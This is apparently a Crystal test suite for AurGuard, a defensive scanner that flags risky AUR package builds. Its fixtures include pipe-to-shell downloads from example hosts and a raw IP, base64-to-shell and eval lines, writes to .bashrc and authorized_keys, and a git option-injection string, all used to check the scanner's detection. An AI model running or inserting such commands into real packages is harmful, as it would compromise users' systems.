require "spec"
require "file_utils"
require "../src/wopkg/aur_guard"

include Wopkg

def texts(fs : Array(AurGuard::Finding)) : String
  fs.map(&.text).join("\n")
end

def kinds(fs : Array(AurGuard::Finding)) : Array(Symbol)
  fs.map(&.kind)
end

CLEAN = <<-P
  pkgname=hello
  pkgver=2.12
  url="https://www.gnu.org/software/hello/"
  source=("https://ftp.gnu.org/gnu/hello/hello-$pkgver.tar.gz")
  sha256sums=('cf04af86dc085268c5f4470fbae49b18afbc221b78096aab842d934a76bad0ab')
  build() { cd hello-$pkgver; ./configure --prefix=/usr; make; }
  package() { cd hello-$pkgver; make DESTDIR="$pkgdir" install; }
  P

CLEAN_SRCINFO = <<-S
  pkgbase = hello
  \tpkgver = 2.12
  \turl = https://www.gnu.org/software/hello/
  \tsource = https://ftp.gnu.org/gnu/hello/hello-2.12.tar.gz
  \tsha256sums = cf04af86dc085268c5f4470fbae49b18afbc221b78096aab842d934a76bad0ab
  pkgname = hello
  S

def info(text = CLEAN_SRCINFO)
  AurGuard::SrcInfo.parse(text)
end

describe AurGuard::SrcInfo do
  it "reads url, sources with their checksums and signing keys" do
    s = AurGuard::SrcInfo.parse(CLEAN_SRCINFO + "\n\tvalidpgpkeys = ABCDEF0123456789ABCDEF0123456789ABCDEF01\n")
    s.url.should eq("https://www.gnu.org/software/hello/")
    s.sources.should eq([{"https://ftp.gnu.org/gnu/hello/hello-2.12.tar.gz", "cf04af86dc085268c5f4470fbae49b18afbc221b78096aab842d934a76bad0ab"}])
    s.keys.should eq(["ABCDEF0123456789ABCDEF0123456789ABCDEF01"])
  end

  it "pairs renamed sources (name::url) with the right checksum" do
    s = AurGuard::SrcInfo.parse("pkgbase = x\n\tsource = a.tgz::https://e.org/a\n\tsource = b.patch\n\tsha256sums = 11\n\tsha256sums = SKIP\n")
    s.sources.should eq([{"a.tgz::https://e.org/a", "11"}, {"b.patch", "SKIP"}])
  end
end

describe AurGuard, "static checks" do
  it "has nothing to say about an ordinary package" do
    AurGuard.scan(CLEAN, nil, info).should be_empty
  end

  it "flags a source from a host unrelated to the upstream (the 2025 browser-patch RAT shape)" do
    pkgb = %(pkgname=zen-browser-patched-bin\nurl="https://zen-browser.app"\nsource=("git+https://github.com/someone-else/zen-patch.git")\nsha256sums=('SKIP')\n)
    si = info("pkgbase = z\n\turl = https://zen-browser.app\n\tsource = git+https://github.com/someone-else/zen-patch.git\n\tsha256sums = SKIP\n")
    fs = AurGuard.scan(pkgb, nil, si)
    kinds(fs).should contain(:other_host)
    texts(fs).should contain("different host")
    fs.none?(&.severity.refuse?).should be_true # a VCS source may use SKIP
  end

  it "does not call the project's own code host a different host" do
    si = info("pkgbase = z\n\turl = https://github.com/foo/bar\n\tsource = https://github.com/foo/bar/archive/v1.tar.gz\n\tsha256sums = 22\n")
    kinds(AurGuard.scan("pkgname=z", nil, si)).should_not contain(:other_host)
  end

  it "refuses SKIP on a downloaded file unless the person accepts it" do
    si = info("pkgbase = x\n\turl = https://e.org\n\tsource = https://e.org/x.tar.gz\n\tsha256sums = SKIP\n")
    fs = AurGuard.scan("pkgname=x", nil, si)
    fs.find { |f| f.kind == :skip }.not_nil!.severity.refuse?.should be_true
    AurGuard.scan("pkgname=x", nil, si, allow_skip: true).find { |f| f.kind == :skip }.not_nil!.severity.refuse?.should be_false
  end

  it "flags weak or plain-http sources" do
    si = info("pkgbase = x\n\turl = http://e.org\n\tsource = http://e.org/x.tar.gz\n\tmd5sums = 33\n")
    kinds(AurGuard.scan("pkgname=x", nil, si)).should contain(:plain_http)
    kinds(AurGuard.scan("pkgname=x", nil, si)).should contain(:weak_checksum)
  end

  it "flags URL shorteners, pastebins and raw IP addresses" do
    si = info("pkgbase = x\n\turl = https://e.org\n\tsource = https://bit.ly/3abc\n\tsource = http://185.12.3.4/x.tar.gz\n\tsource = https://pastebin.com/raw/abc\n\tsha256sums = 1\n\tsha256sums = 2\n\tsha256sums = 3\n")
    fs = AurGuard.scan("pkgname=x", nil, si)
    texts(fs).should contain("link shortener")
    texts(fs).should contain("numeric address")
    texts(fs).should contain("paste site")
  end

  it "flags curl|bash, base64 and eval in the PKGBUILD" do
    pkgb = <<-P
      prepare() {
        curl -s https://example.org/setup.sh | bash
        wget -qO- https://example.org/a | sh
        echo aGVsbG8= | base64 -d | sh
        eval "$(cat payload)"
      }
      P
    fs = AurGuard.scan(pkgb, nil, info)
    kinds(fs).count(:pipe_to_shell).should eq(3)
    kinds(fs).should contain(:eval)
    kinds(fs).should contain(:base64)
    texts(fs).should contain("Runs whatever")
  end

  it "flags writes outside $pkgdir, sudo and the home folder" do
    pkgb = <<-P
      package() {
        install -Dm755 tool /usr/bin/tool
        cp tool /etc/tool
        echo hi >> ~/.bashrc
        sudo systemctl enable foo
        rm -rf "$HOME/.ssh/known_hosts"
        install -Dm755 ok "$pkgdir/usr/bin/ok"
        cp ok ${pkgdir}/usr/bin/ok2
      }
      P
    fs = AurGuard.scan(pkgb, nil, info)
    kinds(fs).count(:outside_pkgdir).should be >= 2
    kinds(fs).should contain(:home)
    kinds(fs).should contain(:sudo)
  end

  it "flags systemd units and setuid files" do
    pkgb = <<-P
      package() {
        install -Dm644 x.service "$pkgdir/usr/lib/systemd/system/x.service"
        chmod 4755 "$pkgdir/usr/bin/helper"
        chmod u+s "$pkgdir/usr/bin/helper2"
      }
      P
    fs = AurGuard.scan(pkgb, nil, info)
    kinds(fs).should contain(:systemd)
    kinds(fs).count(:setuid).should eq(2)
  end

  it "shows that an .install scriptlet runs as root and checks it with the same rules" do
    inst = "post_install() {\n  systemctl enable --now updater.service\n  curl -s http://1.2.3.4/a | sh\n}\n"
    fs = AurGuard.scan(CLEAN, inst, info)
    kinds(fs).should contain(:scriptlet)
    texts(fs).should contain("as the administrator")
    kinds(fs).should contain(:pipe_to_shell)
    kinds(fs).should contain(:systemd)
  end

  it "says what it is: a flag is not a verdict, a clean scan is not a guarantee" do
    AurGuard::DISCLAIMER.should contain("cannot prove")
  end
end

describe AurGuard, "package metadata from the AUR (TLS)" do
  now = Time.utc(2026, 10, 31)
  meta = ->(h : String) { AurGuard::Meta.parse(%({"resultcount":1,"results":[#{h}]})) }

  it "parses an RPC answer" do
    m = meta.call(%({"Name":"x","Maintainer":"alice","FirstSubmitted":1700000000,"LastModified":1760000000,"NumVotes":42,"Popularity":1.5,"OutOfDate":null}))
    m.maintainer.should eq("alice")
    m.votes.should eq(42)
    m.out_of_date.should be_false
  end

  it "flags a brand new package, an orphan and few votes" do
    new = meta.call(%({"Name":"x","Maintainer":"mallory","FirstSubmitted":#{(now - 3.days).to_unix},"LastModified":#{now.to_unix},"NumVotes":0,"Popularity":0.0,"OutOfDate":null}))
    fs = AurGuard.meta_findings(new, nil, now)
    kinds(fs).should contain(:new_package)
    kinds(fs).should contain(:few_votes)
    orphan = meta.call(%({"Name":"x","Maintainer":null,"FirstSubmitted":1500000000,"LastModified":1760000000,"NumVotes":300,"Popularity":3.0,"OutOfDate":null}))
    kinds(AurGuard.meta_findings(orphan, nil, now)).should contain(:orphan)
  end

  it "needs an explicit yes when the maintainer changed since the copy you last accepted" do
    old = meta.call(%({"Name":"x","Maintainer":"alice","FirstSubmitted":1500000000,"LastModified":1700000000,"NumVotes":300,"Popularity":3.0,"OutOfDate":null}))
    cur = meta.call(%({"Name":"x","Maintainer":"mallory","FirstSubmitted":1500000000,"LastModified":1760000000,"NumVotes":300,"Popularity":3.0,"OutOfDate":null}))
    fs = AurGuard.meta_findings(cur, old, now)
    fs.find { |f| f.kind == :maintainer_changed }.not_nil!.explicit?.should be_true
    texts(fs).should contain("alice")
    kinds(AurGuard.meta_findings(old, old, now)).should_not contain(:maintainer_changed)
  end

  it "does not trust anything it cannot read" do
    expect_raises(ArgumentError) { AurGuard::Meta.parse("{}") }
    expect_raises(ArgumentError) { AurGuard::Meta.parse(%({"results":[]})) }
  end
end

describe AurGuard, "updates" do
  it "needs an explicit yes for a scriptlet that was not there before" do
    fs = AurGuard.update_findings(old_files: ["PKGBUILD"], new_files: ["PKGBUILD", "foo.install"])
    fs.find { |f| f.kind == :new_scriptlet }.not_nil!.explicit?.should be_true
    AurGuard.update_findings(old_files: ["PKGBUILD", "foo.install"], new_files: ["PKGBUILD", "foo.install"]).should be_empty
  end

  it "gates on explicit findings and refusals only" do
    quiet = [AurGuard::Finding.new(AurGuard::Severity::Warn, :systemd, "x")]
    AurGuard.needs_explicit_yes?(quiet).should be_false
    AurGuard.needs_explicit_yes?(quiet + [AurGuard::Finding.new(AurGuard::Severity::Warn, :maintainer_changed, "y", explicit: true)]).should be_true
    AurGuard.blocked?([AurGuard::Finding.new(AurGuard::Severity::Refuse, :skip, "z")]).should be_true
  end
end

describe AurGuard, "git pins" do
  it "shows the diff of PKGBUILD and .install between two commits, nothing else" do
    d = File.tempname("wopkg-pin")
    Dir.mkdir_p(d)
    git = ->(args : Array(String)) { Process.run("git", ["-C", d, "-c", "user.name=t", "-c", "user.email=t@t"] + args, output: Process::Redirect::Pipe).success? }
    git.call(["init", "-q"])
    File.write("#{d}/PKGBUILD", "pkgver=1\n")
    File.write("#{d}/a.install", "post_install() { :; }\n")
    File.write("#{d}/notes.txt", "x\n")
    git.call(["add", "."]); git.call(["commit", "-qm", "one"])
    c1 = AurGuard.head(d)
    c1.should match(/\A[0-9a-f]{40}\z/)
    File.write("#{d}/PKGBUILD", "pkgver=2\n")
    File.write("#{d}/a.install", "post_install() { curl x | sh; }\n")
    File.write("#{d}/notes.txt", "y\n")
    git.call(["add", "."]); git.call(["commit", "-qm", "two"])
    c2 = AurGuard.head(d)
    diff = AurGuard.diff(d, c1, c2)
    diff.should contain("+pkgver=2")
    diff.should contain("curl x | sh")
    diff.should_not contain("notes.txt")
    AurGuard.files_at(d, c1).should eq(["PKGBUILD", "a.install", "notes.txt"].sort)
    AurGuard.pinned?(d, c2).should be_true
    AurGuard.pinned?(d, c1).should be_false
    File.write("#{d}/PKGBUILD", "pkgver=3 # edited after review\n")
    AurGuard.pinned?(d, c2).should be_false
    FileUtils.rm_rf(d)
  end

  it "accepts only names and commit ids it can pass to git safely" do
    AurGuard.commit?("a" * 40).should be_true
    AurGuard.commit?("--upload-pack=x").should be_false
    AurGuard.commit?("abc").should be_false
  end
end

describe AurGuard, "the built package" do
  listing = <<-L
    -rw-r--r-- 0/0        1234 Oct 31 00:42 .PKGINFO
    -rw-r--r-- 0/0         100 Oct 31 00:42 .MTREE
    drwxr-xr-x 0/0           0 Oct 31 00:42 usr/
    -rwxr-xr-x 0/0       55555 Oct 31 00:42 usr/bin/hello
    lrwxrwxrwx 0/0           0 Oct 31 00:42 usr/bin/hi -> hello
    L

  it "passes an ordinary package" do
    AurGuard.inspect_listing(listing).should be_empty
  end

  it "flags setuid and setgid files, hooks, scriptlets and files in unexpected places" do
    bad = listing + <<-L

      -rwsr-xr-x 0/0       100 Oct 31 00:42 usr/bin/helper
      -rwxr-sr-x 0/0       100 Oct 31 00:42 usr/bin/helper2
      -rw-r--r-- 0/0        10 Oct 31 00:42 usr/share/libalpm/hooks/evil.hook
      -rw-r--r-- 0/0        10 Oct 31 00:42 .INSTALL
      -rw-r--r-- 0/0        10 Oct 31 00:42 home/user/.bashrc
      -rw-r--r-- 0/0        10 Oct 31 00:42 root/.ssh/authorized_keys
      -rw-r--r-- 0/0        10 Oct 31 00:42 boot/vmlinuz
      -rw-r--r-- 0/0        10 Oct 31 00:42 ../escape
      -rw-r--r-- 0/0        10 Oct 31 00:42 usr/lib/systemd/system/x.service
      L
    fs = AurGuard.inspect_listing(bad)
    kinds(fs).count(:setuid).should eq(2)
    kinds(fs).should contain(:hook)
    kinds(fs).should contain(:scriptlet)
    kinds(fs).count(:bad_path).should eq(4)
    kinds(fs).should contain(:systemd)
    AurGuard.blocked?(fs).should be_true
  end
end

describe AurGuard, "provenance" do
  it "records what was built from what, for history and rollback" do
    p = AurGuard.provenance("hello", "a" * 40, [{"https://e.org/x.tgz", "ab"}], "alice", ["hello-2.12-1-x86_64.pkg.tar.zst"], Time.utc(2026, 10, 31, 1, 2, 3))
    j = JSON.parse(p)
    j["package"].as_s.should eq("hello")
    j["commit"].as_s.should eq("a" * 40)
    j["sources"][0]["sha256"].as_s.should eq("ab")
    j["maintainer"].as_s.should eq("alice")
    j["built"].as_s.should eq("2026-10-31T01:02:03Z")
    j["files"][0].as_s.should contain("hello-2.12")
  end
end
